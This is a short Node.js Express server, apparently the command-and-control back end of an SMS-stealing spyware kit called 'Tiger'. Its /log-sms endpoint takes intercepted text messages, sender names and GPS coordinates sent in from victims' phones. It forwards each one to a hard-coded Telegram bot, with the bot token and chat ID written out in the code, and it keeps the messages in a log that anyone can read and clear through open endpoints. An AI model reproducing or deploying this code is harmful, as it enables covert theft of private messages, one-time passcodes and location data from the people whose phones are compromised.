const express = require('express');
const axios = require('axios');
const path = require('path');
const cors = require('cors'); 
const app = express();

app.use(cors()); 
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// --- CONFIGURATION ---
// Naya token BotFather se lekar yahan dalein
const BOT_TOKEN = '8394719862:AAGdG06eMVj_Mz4hFCqv-jHrmyiSqsDXppk'; 
const CHAT_ID = '7128071523';
// ---------------------

let smsLogs = [];

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/log-sms', async (req, res) => {
    try {
        const { sender, message, device, timestamp, location } = req.body;
        
        const newEntry = {
            id: Date.now(),
            device: device || 'Tiger-Mobile',
            sender: sender || 'Unknown',
            message: message || 'No Content',
            time: timestamp || new Date().toLocaleString(),
            location: location || null
        };

        smsLogs.unshift(newEntry);
        if (smsLogs.length > 200) smsLogs.pop();

        // Google Maps Link (Agar location aayi hai)
        const mapUrl = location ? `\n📍 Location: https://www.google.com/maps?q=${location.latitude},${location.longitude}` : '';

        const telegramMsg = `🐯 *Tiger Alert!*\n\n` +
                          `📱 *Device:* ${newEntry.device}\n` +
                          `👤 *From:* ${newEntry.sender}\n` +
                          `💬 *Message:* ${newEntry.message}\n` +
                          `⏰ *Time:* ${newEntry.time}` + mapUrl;

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: telegramMsg,
            parse_mode: 'Markdown'
        });

        console.log(`[✓] Data sent to Telegram from ${newEntry.sender}`);
        res.status(200).json({ status: 'success' });

    } catch (error) {
        console.error('Error Details:', error.response ? error.response.data : error.message);
        res.status(500).json({ status: 'error' });
    }
});

app.get('/get-logs', (req, res) => {
    res.json(smsLogs);
});

app.post('/clear-logs', (req, res) => {
    smsLogs = [];
    res.json({ success: true });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
    console.log(`🚀 Tiger Server is Live on Port ${PORT}`);
});
